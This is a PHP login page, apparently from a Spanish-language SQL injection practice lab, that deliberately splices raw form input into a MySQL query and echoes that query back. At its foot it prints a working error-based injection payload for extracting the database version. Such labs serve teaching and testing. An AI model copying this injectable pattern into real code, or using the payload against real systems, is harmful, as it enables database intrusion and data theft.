<?php


echo "<a href='/'>Ir anicio</a>";
if(isset($_POST['user']) and isset($_POST['pass']))
{

	
	$conexion= mysqli_connect("127.0.0.1","root","") or die("no se puede conectar");
	mysqli_select_db($conexion,"sqli") or die("no se encontro la base de datos");
	mysqli_set_charset($conexion,"utf8") or die("no se pudo poner la codificacion");

		
		$resultado= mysqli_query($conexion,'select * from login where usuario=("'.$_POST['user'].'") and contraseña=("'.$_POST['pass'].'")');


		#if (mysqli_fetch_array($resultado))
		if (mysqli_num_rows($resultado))
		{
			setcookie("usuario","jose", time()+3600,"/");  /* expira en una hora */
			#setcookie("usuario","", time()-3600,"/"); #para borrar una cookie
			header("Location: /sql_injeccion_cookie/tienda.php");

		}
		else
		{
			echo "<br><br>CONTRASEÑA O USUARIO NO VALIDOS<br><br>";

			echo "En esta consulta se utiliza comillas dobles y Parentesis utiliza injecciones que contengan comillas dobles y Parentesis<br>";
		echo '<strong>select * from login where usuario=("<font color="red">'.$_POST['user'].'</font>") and contraseña=("<font color="red">'.$_POST['pass'].'</font>")</strong><br><br>';
		}


}



?>


<!DOCTYPE html>
<html>
<head>
	<title></title>
</head>
<body>


<table >
	
<form action="" method="POST">
	<tr>
		<td align="right">
			<label>Usuario: </label>
		</td>
		<td>
			<input type="text" name="user" value="jose">
		</td>
	</tr>
	<tr>
		<td align="right">
			<label>Contrasela: </label>
		</td>
		<td>
			<input type="password" name="pass" value="123">
		</td>
	</tr>


	<tr>
		<td align="center" colspan="2">
			<input type="submit" name="btn" value="Entrar">
		</td>
	</tr>



</form>
</table>


<br><br><labrl>Esta Injeccion es para extraer informacion de la base de datos con SQLI BASE-ERROR</label><br><br>
 <label>" OR ROW(1706,6680)>(SELECT COUNT(*),CONCAT(0x2a7c3e,(sElEcT( sElEcT cOnCaT(version())) fRoM information_schema.tAbLeS lImIt 0,1),(SELECT (ELT(1706=1706,1))),0x3c7c2a,FLOOR(RAND(0)*2))x fRoM information_schema. tAbLeS gRoUp bY x) and "1"="1#</label>
</body>
</html>